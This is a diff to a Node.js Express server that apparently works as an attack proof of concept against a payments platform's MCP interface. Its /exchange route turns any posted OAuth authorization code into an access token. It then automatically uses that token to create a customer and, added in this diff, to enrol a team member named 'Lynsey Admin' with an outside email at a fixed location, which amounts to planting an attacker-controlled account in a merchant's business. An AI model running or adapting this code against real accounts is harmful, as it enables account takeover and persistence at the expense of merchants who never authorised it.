@@ -1,7 +1,7 @@
 import express from "express";
 import fetch from "node-fetch";
 import path from "path";
-import http2 from "http2"; // Native HTTP/2 module
+import http2 from "http2";
 import { fileURLToPath } from "url";
 
 const __filename = fileURLToPath(import.meta.url);
@@ -23,7 +23,7 @@ const MCP_HOST = "https://mcp.squareup.com";
 const USER_AGENT = "BurpSuite";
 
 // ==========================================
-// MCP CLIENT LOGIC (Node.js Implementation)
+// MCP CLIENT LOGIC
 // ==========================================
 function runMcpClient(accessToken) {
     return new Promise((resolve, reject) => {
@@ -42,7 +42,6 @@ function runMcpClient(accessToken) {
             resolve(logs.join('\n'));
         });
 
-        // Headers for SSE
         const sseHeaders = {
             ':path': '/sse',
             ':method': 'GET',
@@ -57,9 +56,17 @@ function runMcpClient(accessToken) {
         let buffer = "";
         let sessionId = null;
         let postUrlPath = null;
-        let currentStep = 0; // 0=WaitID, 1=List, 2=Create
+        
+        // State Machine:
+        // 0: Initial
+        // 1: Waiting for Tools List (ID 1)
+        // 2: Waiting for Create Customer (ID 2)
+        // 3: Waiting for Create Team Member (ID 3)
+        let currentStep = 0; 
 
-        // Customer Payload
+        // --- PAYLOADS ---
+
+        // 1. Create Customer
         const customerPayload = {
             "jsonrpc": "2.0",
             "method": "tools/call",
@@ -69,17 +76,59 @@ function runMcpClient(accessToken) {
                     "service": "customers",
                     "method": "create",
                     "request": {
-                        "given_name": "Nikhil",
-                        "family_name": "Kaushik User (NodeJS)",
-                        "email_address": "travelokfhaisudhaiushdiashdiuh@gmail.com"
+                        "given_name": "Lynsey",
+                        "family_name": "Admin",
+                        "email_address": "5381lynsey@airsworld.net"
                     },
-                    "characterization": "Create a new customer for testing"
+                    "characterization": "Create Lynsey Admin Customer"
                 }
             },
             "id": 2
         };
 
-        // Helper to send POST requests over the same HTTP/2 session
+        // 2. Create Team Member (Bulk)
+        const teamMemberPayload = {
+            "jsonrpc": "2.0",
+            "method": "tools/call",
+            "params": {
+                "name": "make_api_request",
+                "arguments": {
+                    "service": "team",
+                    "method": "bulkCreatemembers", // Note: Verify method name case-sensitivity (API often uses snake_case or camelCase)
+                    "request": {
+                        "team_members": {
+                            "invite_lynsey_admin_20260103": {
+                                "team_member": {
+                                    "given_name": "Lynsey",
+                                    "family_name": "Admin",
+                                    "email_address": "5381lynsey@airsworld.net",
+                                    "assigned_locations": {
+                                        "location_ids": ["LEM77QX2ADM7X"],
+                                        "assignment_type": "EXPLICIT_LOCATIONS"
+                                    },
+                                    "wage_setting": {
+                                        "job_assignments": [
+                                            {
+                                                "job_id": "BwEYtsGojCAdzMTVG1ZC5HHC",
+                                                "pay_type": "SALARY",
+                                                "annual_rate": {
+                                                    "amount": 0,
+                                                    "currency": "USD"
+                                                },
+                                                "weekly_hours": 40
+                                            }
+                                        ]
+                                    }
+                                }
+                            }
+                        }
+                    },
+                    "characterization": "Add Lynsey Admin as Team Member"
+                }
+            },
+            "id": 3
+        };
+
         const sendJsonRpc = (payload, description) => {
             if (!sessionId || !postUrlPath) return;
 
@@ -99,9 +148,9 @@ function runMcpClient(accessToken) {
             req.setEncoding('utf8');
             req.write(JSON.stringify(payload));
             req.end();
-
+            
             req.on('response', (headers) => {
-                log(`[POST] Status: ${headers[':status']}`);
+                log(`[POST STATUS] ${headers[':status']}`);
             });
         };
 
@@ -110,26 +159,24 @@ function runMcpClient(accessToken) {
         sseStream.on('data', (chunk) => {
             buffer += chunk;
             const lines = buffer.split('\n');
-            buffer = lines.pop(); // Keep the last incomplete line
+            buffer = lines.pop(); 
 
             for (const line of lines) {
                 if (!line.trim()) continue;
 
-                // 1. Capture Session ID
+                // Capture Session ID
                 if (line.startsWith("data:") && line.includes("sessionId=")) {
                     const dataStr = line.replace("data: ", "").trim();
                     const match = dataStr.match(/sessionId=([^&]+)/);
                     
                     if (match) {
                         sessionId = match[1];
-                        // Extract relative path from full URL or data string
-                        // e.g., "/sse/message?sessionId=..."
                         postUrlPath = dataStr.replace(MCP_HOST, ""); 
                         
                         if (currentStep === 0) {
                             log(`[SSE] Session ID Captured: ${sessionId}`);
                             
-                            // STEP 1: Tools List
+                            // STEP 1: List Tools
                             sendJsonRpc({
                                 "jsonrpc": "2.0", 
                                 "method": "tools/list", 
@@ -140,37 +187,48 @@ function runMcpClient(accessToken) {
                     }
                 }
 
-                // 2. Handle JSON-RPC Responses
+                // Handle JSON-RPC Responses
                 if (line.startsWith("data:") && line.includes("jsonrpc")) {
                     try {
                         const content = line.replace("data: ", "").trim();
                         const data = JSON.parse(content);
+                        const msgId = data.id;
 
-                        // Response to tools/list (ID: 1)
-                        if (data.id === 1 && currentStep === 1) {
-                            log("\n========================================\n [SUCCESS] TOOLS LIST RECEIVED\n========================================");
-                            
-                            // STEP 2: Create Customer
+                        // ID 1: Tools List Received -> Send Create Customer
+                        if (msgId === 1 && currentStep === 1) {
+                            log("\n[SUCCESS] TOOLS LIST RECEIVED");
                             sendJsonRpc(customerPayload, "Create Customer (ID: 2)");
                             currentStep = 2;
                         }
 
-                        // Response to Create Customer (ID: 2)
-                        else if (data.id === 2 && currentStep === 2) {
-                            log("\n========================================\n [SUCCESS] CUSTOMER CREATED\n========================================");
+                        // ID 2: Customer Created -> Send Create Team Member
+                        else if (msgId === 2 && currentStep === 2) {
+                            log("\n[SUCCESS] CUSTOMER CREATED");
                             log(JSON.stringify(data, null, 2));
                             
-                            // Cleanup and Finish
+                            sendJsonRpc(teamMemberPayload, "Create Team Member (ID: 3)");
+                            currentStep = 3;
+                        }
+
+                        // ID 3: Team Member Created -> FINISH
+                        else if (msgId === 3 && currentStep === 3) {
+                            log("\n[SUCCESS] TEAM MEMBER CREATED");
+                            log(JSON.stringify(data, null, 2));
+                            
                             session.close();
                             resolve(logs.join('\n'));
                         }
 
                         else if (data.error) {
-                            log(`[ERROR] JSON-RPC Error: ${JSON.stringify(data.error)}`);
+                            log(`\n[ERROR] JSON-RPC Error (ID: ${msgId}):`);
+                            log(JSON.stringify(data.error, null, 2));
+                            // On error, we might want to close or keep going. Here we close.
+                            session.close();
+                            resolve(logs.join('\n'));
                         }
 
                     } catch (e) {
-                        // ignore parsing errors for non-json lines
+                        // ignore parse errors
                     }
                 }
             }
@@ -184,15 +242,22 @@ function runMcpClient(accessToken) {
 }
 
 // ==========================================
-// EXPRESS SERVER ROUTES
+// SERVER ROUTES
 // ==========================================
 
 app.post("/exchange", async (req, res) => {
     try {
-        const { code } = req.body;
-        console.log("[SERVER] Exchanging code:", code);
+        let { code } = req.body;
+        
+        if (!code) {
+            return res.status(400).json({ error: "No code provided" });
+        }
 
-        // 1. Exchange Code for Token
+        // 1. URL DECODE THE CODE
+        code = decodeURIComponent(code);
+        console.log("[SERVER] Decoded Code:", code);
+
+        // 2. Exchange for Token
         const params = new URLSearchParams();
         params.append("grant_type", "authorization_code");
         params.append("code", code);
@@ -213,15 +278,15 @@ app.post("/exchange", async (req, res) => {
         const tokenData = await tokenRes.json();
         
         if (!tokenData.access_token) {
+            console.error("Token Error:", tokenData);
             return res.status(400).json(tokenData);
         }
 
-        console.log("[SERVER] Token retrieved. Starting MCP Client...");
+        console.log("[SERVER] Access Token OK. Starting MCP...");
 
-        // 2. Run Internal MCP Client
+        // 3. Run MCP Sequence
         const mcpLogs = await runMcpClient(tokenData.access_token);
 
-        // 3. Return Results
         res.json({
             token_data: tokenData,
             mcp_logs: mcpLogs
